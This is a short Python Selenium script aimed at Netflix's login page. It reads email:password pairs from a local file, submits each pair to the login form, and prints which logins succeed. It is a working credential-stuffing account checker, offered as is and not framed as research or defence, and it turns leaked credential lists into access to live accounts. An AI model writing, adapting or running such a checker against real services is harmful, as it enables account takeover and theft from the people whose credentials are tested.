from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time

options = Options()
options.headless = False

options.add_argument('--ignore-certificate-errors')
options.add_argument('--allow-running-insecure-content')
options.add_argument("--disable-extensions")
options.add_argument("--start-maximized")
options.add_argument('--disable-gpu')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')


driver = webdriver.Chrome(service = Service(ChromeDriverManager().install()),options = options)

Link = "https://www.netflix.com/md/login"
driver.get("https://www.netflix.com/md/login")

file = open("netflix_accounts.txt",'r')

for f in file:
	try:
		email = WebDriverWait(driver, 10).until(
			EC.presence_of_element_located((By.XPATH, '//*[@id="id_userLoginId"]'))
		)
		password = WebDriverWait(driver, 10).until(
			EC.presence_of_element_located((By.XPATH, '//*[@id="id_password"]'))
		)
		submit = WebDriverWait(driver, 10).until(
			EC.presence_of_element_located((By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button'))
		)
		email.clear()
		password.clear()
		a = f.split(':')
		email2 = a[0]
		password2 = a[1][:-1]
		email.send_keys(email2)
		password.send_keys(password2)
		submit.click()
		time.sleep(1)
		if driver.current_url != Link:
			print("Succes--> ",email2," ",password2)
		else:
			print("Fail--> ",email2," ",password2)
			
	except:
		print("Error: ",email2," ",password2)
		driver.get("https://www.netflix.com/md/login")
		continue

time.sleep(1)
driver.quit()


